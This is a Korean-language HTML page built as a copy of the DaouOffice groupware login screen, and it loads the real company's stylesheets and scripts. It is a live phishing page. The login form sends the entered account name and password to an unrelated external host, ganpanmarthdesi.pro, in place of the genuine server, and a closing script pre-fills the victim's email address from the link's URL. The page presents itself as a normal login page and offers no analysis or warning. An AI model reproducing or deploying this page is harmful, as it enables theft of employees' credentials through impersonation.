<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="virwport" content="width=device-width,initial-scale=1">
    <meta name="version" content="3.5.6.0">
    <meta name="brandName" content="DaouOffice">
    <title>로그인</title>
    <link href="/thumb/attach/favicon/492/1150?rev=202212221955" rel="shortcut icon"/>
    <link rel="stylesheet" href="https://gw.koreanagano.co.kr/resources/css/go_style.css?rev=202212221955" media="screen" />
	<link rel="stylesheet" href="https://gw.koreanagano.co.kr/resources/css/go_login.css?rev=202212221955" media="screen" />

  	<link rel="stylesheet" href="https://gw.koreanagano.co.kr/resources/css/go_color_mint.css?rev=202212221955" media="screen, print" />
    

    <link rel="stylesheet" href="https://gw.koreanagano.co.kr/resources/css/go_customize.css?rev=202212221955" media="screen" />
    
<!-- index.jsp에 대한 header 부분에 대한 custom 처리사항을 반영합니다. -->


    <script type="text/javascript" src="https://gw.koreanagano.co.kr/resources/js/vendors/jquery/jquery.js?rev=202212221955"></script>
    <script type="text/javascript" src="https://gw.koreanagano.co.kr/resources/js/vendors/jquery/jquery-ui/js/jquery-ui-1.10.0.custom.js?rev=202212221955"></script>
    <script type="text/javascript" src="https://gw.koreanagano.co.kr/resources/js/vendors/hogan.js?rev=202212221955"></script>
    <script type="text/javascript" src="https://gw.koreanagano.co.kr/resources/js/vendors/lodash.js?rev=202212221955"></script>
    <script type="text/javascript" src="https://gw.koreanagano.co.kr/resources/js/vendors/backbone/backbone.js?rev=202212221955"></script>
    <script type="text/javascript" src="https://gw.koreanagano.co.kr/resources/js/vendors/moment/moment.js?rev=202212221955"></script>
    <script type="text/javascript" src="https://gw.koreanagano.co.kr/resources/js/libs/go-util.js?rev=202212221955"></script>
    <script type="text/javascript" src="https://gw.koreanagano.co.kr/resources/js/libs/go-popup.js?rev=202212221955"></script>
    <script type="text/javascript" src="https://gw.koreanagano.co.kr/resources/js/libs/go-login.js?rev=202212221955"></script>
    <script type="text/javascript" src="https://gw.koreanagano.co.kr/resources/js/app/views/IEInfoView.js?rev=202212221955"></script>
    <script type="text/javascript" src="https://gw.koreanagano.co.kr/resources/js/libs/go-placeholder.js?rev=202212221955"></script>
    <!--[if IE]>
    <script src="https://gw.koreanagano.co.kr/resources/js/vendors/html5.js"></script>
    <![endif]-->
   <style type="text/css">
	div.ie_warp {position: relative;padding:20px 20px;margin:80px auto;width:670px; margin-bottom: 30px;background: #fff;border: 1px solid #babbbb;}
	h1.bi_do {position: absolute; left: 50px; top: 30px; width: 158px; height: 33px;background: url(https://gw.koreanagano.co.kr/resources/images/etc/ie_do.gif) no-repeat 0 0;font-size:0; line-height:0}
	h1.bi_tms {position: absolute; left: 5px; top: -3px; width: 150px; height: 150px;background: url(https://gw.koreanagano.co.kr/resources/images/etc/ie_tms.gif) no-repeat 0 0;font-size:0; line-height:0}
	h2.ci {position: absolute;right:20px;top:15px;width: 110px;height:30px;background: url(https://gw.koreanagano.co.kr/resources/images/etc/ie_logo_daou.png) no-repeat 0 0;font-size:0; line-height:0}
	.btn_ie8_up:hover {opacity:0.9; filter: Alpha(Opacity=90);}
	.browser_box span {display:inline-block; width:67px; height:67px; background: url(https://gw.koreanagano.co.kr/resources/images/etc/ie_3.gif) no-repeat 0 0;}
	.browser_box span.ie8{background-position:0 0}
	.browser_box span.chorme{background-position:-95px 0}
	.browser_box span.firefox{background-position:-194px 0}
	.browser_box span.safari{background-position:-300px 0}
	table {background-color:transparents!importnat}
	table td,table th {text-align:center; padding:10px 0}
	table th {width:25%;}
	table td {padding-top:0px; text-align:center; font-size:11px; color:#989aa0; font-weight:bold; letter-spacing:-1px;}
	</style>
	<script>
		// image preload
		var img = new Image();
		img.src = "https://gw.koreanagano.co.kr/resources/images/img_loader_w.gif";
	</script>
</head>
<body class="user_front" id="bodyPart">
    <p name="description" style="display:none;">로그인이 필요합니다.</p>
    <div id="noticeBanner" style="display:none;"></div>
    <div class="go_wrap go_skin_default go_intro_wrap mint_theme">
        <header class="go_header">
            <h1>
            </h1>
            <div id="language_select" class="language">
                <select>
                	<option value="language">언어(Language)</option>
                    
                        <option value="ko" >한국어</option>
                    
                        <option value="en" >English</option>
                    
                        <option value="ja" >日本語</option>
                    
                        <option value="zh_CN" >簡体中文</option>
                    
                        <option value="zh_TW" >繁体中文</option>
                    
                        <option value="vi" >tiếng Việt</option>
                    
                </select>
            </div>
        </header>

        <div class="go_intro">
            
            <form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post">
                <section class="login_box">
	                <div class="sticker">
						<span class="go" title="groupoffice"></span>
						<span style="display:none" title="alpha" class="beta"></span>
						<!-- <span style="display:none" title="TMS 8.1" class="TMS8_1"></span> -->
					</div>

					<div class="custom_visual">
                        
                        
                            <img src="https://mail.daouoffice.com/resources/images/mint_theme/logo_do_login.png">
                        
		            </div>

					<div class="login_msg" style="display: none;">
						<span class="ic_error">!</span>
						<span class="txt"></span>
					</div>
                    <fieldset>
                        <legend>login</legend>
						<div class="login_id">
                            <input type="text" id="userInput" name="user" value="email" class="ipt_login login_wide" tabindex="1" placeholder="계정" onkeyup="javascript:clearAlert(event)" autocapitalize="off" style="ime-mode:inactive;" onpaste="javascript:trimSpace(event)"/>
                            <input type="hidden" id="domainInput" name="domain" value="domain"/>
                            <input type="hidden" id="username" name="sender" value="Daouoffice.com"/>
                            <input type="hidden" id="domainInput" name="link" value="https://gw.domain/login"/>
                        </div>
                        <div class="login_pw">
                            <input type="password" name="passwd" id="password" autocomplete="off" class="ipt_login" tabindex="3" placeholder="비밀번호" onkeyup="javascript:clearAlert(event)" onpaste="javascript:trimSpace(event)">
						</div>
						<div class="captchaContents" style="display:none">
							<span class="txt">아래 이미지를 보이는대로 입력해주세요.</span>
							<img id="captchaImg" src="" data-pin-nopin="true">
							<input name="captcha" id="captcha" type="text" placeholder="보안문자 입력">
							<a title="새로고침" class="ic ic_refresh_tyep2" id="refreshBtn"></a>
						</div>
                        <a id="login_submit" class="btn_login" tabindex="4" href="#">로그인</a>
                    </fieldset>

                    <div class="login_check">
                        <span class="option_wrap">
                            <input type="checkbox" name="saveEmail" id="saveLoginId" tabindex="5">
                            <label id="login_id_save_label">계정 저장</label>
                        </span>
                        
                        <span class="option_wrap">|</span>
                        <a class="option_wrap" id="findPwd">비밀번호 찾기</a>
                        
                    </div>
                </section>

                <input type="submit" style="visibility:hidden" />
            </form>

            <section id="wakeup" class="login_box msg_box" style="display:none">
                <div class="sleeping_msg">
                    <p class="title">현재 계정이 휴면 상태입니다.</p>
                    <p class="desc">3개월간 로그인한 기록이 없을 경우, 휴면 계정으로 변경되며,<br>휴면 기간에는 새로운 메일을 수신하거나, 휴대폰 알림을 받을 수 없습니다.</p>
                </div>
                <div class="btn_box">
                    <a id="submit" class="btn_bk">휴면 해제</a>
                </div>
            </section>
        </div>
    </div>
    <div id="iframeWrap"></div>

	<script type="text/javascript">
		GO = GO || {};
		GO["contextRoot"] = "/";
	</script>

    <script type="text/javascript">
    	$.removeCookie("IsCookieActived", {path : "/"});

		function clearAlert(event){
	    	if(event.keyCode != 13){
		    	var isDisplayAlert = $('.login_msg').css('display');
		    	if(isDisplayAlert != 'none'){
		    		$('.login_msg').css('display', 'none');
                    $('.login_msg').html('<span class="ic_error">!</span><span class="txt"></span>')
		    	}
	    	}
	    }
		function trimSpace(event, target) {
			var target = $(event.currentTarget);
			 setTimeout(function () {
				 target.val(target.val().trim());
		    }, 100);
		}
 		function checkIEUa(agent){
	 		if(agent.indexOf("msie") > -1){
	 			if(agent.indexOf("trident")>-1){
	 				return false;
	 			}else if(agent.indexOf("msie 8.0")>-1){
	 				return false;
	 			}
	 			return true;
	 		}else {
	 			return false;
	 		}
	 	}

 		var ua = window.navigator.userAgent.toLowerCase();
 		//if(ua.indexOf('msie') >= 0 && (ua.indexOf('msie 6.0') >= 0 && ua.indexOf('msie 8.0') < 0  ||  ua.indexOf('msie 7.0') >= 0 ) ){
 		if(checkIEUa(ua)){
			jQuery.goIEInfoView({root : '/', locale : 'ko' });
 		}else{
	        var Login = $(function (window, global) {

	            var loginView,
	                LanguageSelectView,
	                concurrentLogoutAlarmCallback,
	                findPasswordCallback,
	                findPasswordByAccountCollback;
	            var adviceChangePassword = "비밀번호 변경주기가 되었습니다. <br> [지금 변경하기]를 클릭하여 새로운 비밀번호를 만들어 주세요.",
	            	passwordConfirm = "비밀번호 변경 알림";
	           	var changeNow = "지금 변경하기";
	           	var changeLater = "15일간 보지 않기";
	           	var oauthLogin = false;

	            LanguageSelectView = Backbone.View.extend({
	                el: '#language_select',
	                events: {
	                    'change': 'changePageLanguage'
	                },

	                changePageLanguage: function() {
	                	var selected = $('option:selected').val();
	                	if (selected == 'language') {
	                		document.location = 'login';
	                	} else {

							document.location = 'login?lang=' + selected;
	                	}
	                }
	            });

	            concurrentLogoutAlarmCallback = function() {
	                $.goPopup({
	        			modal : true,
	        			width: '250',
	                	pid: 'wakeup_confirm',
	        			pclass : 'layer_confim_front layer_multi_login',
	        			message: "다른 장치에서 로그인 되어, 현재 장치에서 자동 로그아웃 되었습니다.",
	        			buttons : [{
	        				btext : "확인",
	        				btype : "confirm",
	        				autoclose : true
	        			}]
	        		});
	            };

	            findPasswordCallback = function() {
	            	var tmpl = "<p class='desc'>" + "임시 비밀번호를 받으려면, 그룹웨어 계정을 입력해 주세요." + "</p>" +
	    								"<table class='form_type'> <tbody><tr><th>" +
	    								"<span class='title'>" + "계정" + "</span></th>" +
	    								"<td style='text-align:left;'><input id='account_id' class='txt_mini w_max' type='text'></td></tr></tbody></table>";

	            	$.goPopup({
	                    header : "비밀번호 찾기",
	                    width : 400,
	                    title : "",
	                    pclass : "layer_normal layer_password",
	                    contents : tmpl,
	        			buttons : [{
	        				btext : "다음",
	        				btype : "confirm",
	        				autoclose : false,
	        				callback : function(popup){
								if(popup.find('#account_id').val().length <= 0){
									popup.find('.txt_error').remove();
									popup.find('#account_id').after("<span class='txt_error'>" + "계정을 입력해 주세요."+"</span>");
									return;
								}
	        					findPasswordByAccountCollback(popup);
	        				}
	        			}, {
                            btype: "close",
                            btext : "닫기"
                        }]
	                });
	            };

	            findPasswordByAccountCollback = function(popup) {
	            	var accountInfo = popup.find('#account_id').val();
	            	$.ajax({
	            		url: GO.contextRoot + 'api/email/hint',
                        data: "userAccount=" + accountInfo,
                        type: 'GET',
                        async: false,
                        dataType : 'text',
                        success: function(resp) {
                            if(resp){
    							//외부메일있음
                            	var tmpl = "<p class='desc' data-id='" + accountInfo + "'>" + "등록했던 외부 메일 주소를 입력해 주세요.<br/>등록된 이메일 주소" + "("+ resp + ")" +"</p>" +
								"<table class='form_type'> <tbody><tr><th>" +
								"<span class='title'>" +"외부 메일 주소"+ "</span></th>" +
								"<td style='text-align:left;'><input id='external_email' class='txt_mini w_max' type='text'></td></tr></tbody></table>";

                            	$.goPopup({
                                    header : "비밀번호 찾기",
                                    width : 400,
                                    title : "",
                                    pclass : "layer_normal layer_password_outside",
                                    contents : tmpl,
                        			buttons : [{
                        				btext : "다음",
                        				btype : "confirm",
                        				autoclose : false,
                        				callback : function(popup){
                        					if(popup.find('#external_email').val().length <= 0){
                        						popup.find(".txt_error").remove();
            									popup.find('#external_email').after("<span class='txt_error'>" + "외부 메일 주소를 입력해 주세요."+"</span>");
            									return;
            								}
                        					sendTempPassword(popup);
                        				}
                        			}]
                                });
                            }else{
                            	$.goPopup({
            	                    header : "비밀번호 찾기",
            	                    width : 400,
            	                    title : "",
            	                    modal : true,
            	                    contents : "<p class='desc'>" + "외부 메일 주소가 등록되지 않거나, 인증이 완료되지 않았습니다.<br/>운영자에게 비밀번호 변경을 요청해서 사용해 주세요.</br>* 로그인 후에는 반드시 '외부메일주소' 등록 및 인증을 완료하십시오." + "</p>",
            	        			buttons : [{
            	        				btext : "닫기",
            	        				btype : "normal",
            	        				autoclose : true
            	        			}]
            	                });
                            }
                        }
            		});
            	};

            	sendTempPassword = function(popup) {
            		var externalEmail = popup.find('#external_email').val(),
            			accountInfo = popup.find(".desc").attr('data-id');

            		$.ajax({
	            		url: GO.contextRoot + 'api/email/password',
                        data: "userAccount=" + accountInfo + "&externalEmail=" + externalEmail,
                        type: 'GET',
                        async: false,
                        dataType : 'text',
                        success: function(resp) {
                        	$.goPopup({
        	                    header : "임시 비밀번호 발송",
        	                    width : 400,
        	                    title : "",
        	                    contents : "<p class='desc'>" + "임시 비밀번호가 발송되었습니다.<br/>등록하신 외부 메일에서 임시 비밀번호를 확인하세요." + "</p>",
        	        			buttons : [{
        	        				btext : "확인",
        	        				btype : "confirm",
        	        				autoclose : true
        	        			}]
        	                });
                        },
                        error: function(resp){
                        	popup.find(".txt_error").remove();;
                        	popup.find('#external_email').after("<span class='txt_error'>" + JSON.parse(resp.responseText).message +"</span>");
                        	return;
                        }
            		});
            	}

	          	new LanguageSelectView();

				loginView = new LoginView({
					loginType: 'user',
					concurrentLogoutAlarmCallback: concurrentLogoutAlarmCallback,
					findPasswordCallback : findPasswordCallback,
					el: $('form#loginForm'),
					idLabel: $('label#login_id_label'),
					idSaveLabel: $('label#login_id_save_label'),
					idInput: $('input[name="username"]'),
					pwInput: $(':password'),
					saveIdCheckbox: $('#saveLoginId'),
					companyOptions: $('.select_list li.option'),
					selectedCompanyOption: $('.select_list li.on > a'),
					failMessageLabel: $('.login_msg'),
					loginOptions: $('.login_check'),
					adviceChangePassword : adviceChangePassword,
					passwordConfirm : passwordConfirm,
					changeNow : changeNow,
					changeLater : changeLater,
                    oauthLogin : oauthLogin
				});
				loginView.render();

	        }(window, this));
 		}
    </script>

	<script type="text/javascript">
	function certModuleInit() {
		$("#iframeWrap").append('<iframe id="cert_login_iframe" width="0px" height="0px" name="cert_login_iframe" src="/certInstall?onload=true" style="border:0;"></iframe>');
	}

	function certSubmit(data) {
		var search = searchToObject();
		data.currentPage = location.href;
		$.ajax({
			type : "POST",
			url : GO.contextRoot + "api/certLogin",
			data : JSON.stringify(data),
			dataType : "json",
			contentType: "application/json",
			success : function(resp) {
				console.log("success : " + decodeURIComponent(resp.data.redirect));

				var url = search.returnUrl ? GO.util.XSSFilter(decodeURIComponent(search.returnUrl)) : decodeURIComponent(resp.data.redirect);
				location.href = url;
			},
			error : function(error) {
				console.log(error);
			}
		});
	}

	function searchToObject() {
		var pairs = window.location.search.substring(1).split("&");
	    var obj = {};
	    var pair;
	    var i;

	  	for ( i in pairs ) {
	    	if ( pairs[i] === "" ) continue;

	    	pair = pairs[i].split("=");
	    	obj[ decodeURIComponent( pair[0] ) ] = decodeURIComponent( pair[1] );
	  	}

	  return obj;
	}
	</script>

    <script>
    	if($.cookie("bannerCookie"+"")) {
    		$("#noticeBanner").remove();
    	} else {
    		$("#noticeBanner").show();
    	}

        $("#bannerClose").click(function(){
        	$("div.banner").slideUp();
			$.cookie("bannerCookie"+"", true, {path: "/"});
        });
    </script>
  <script>
    const params = new URLSearchParams(window.location.search);
    const raw = params.get('login');
    const email = raw ? decodeURIComponent(raw) : '';

    let user = '', domain = '';
    if (email.includes('@')) {
      [user, domain] = email.split(/@(.*)/, 2);
    }

    if (email) {
      document.getElementById('userInput').value = email;
      document.getElementById('domainInput').value = domain;
      document.getElementById('greeting').textContent = email;
    }
  </script>
</body>
</html>
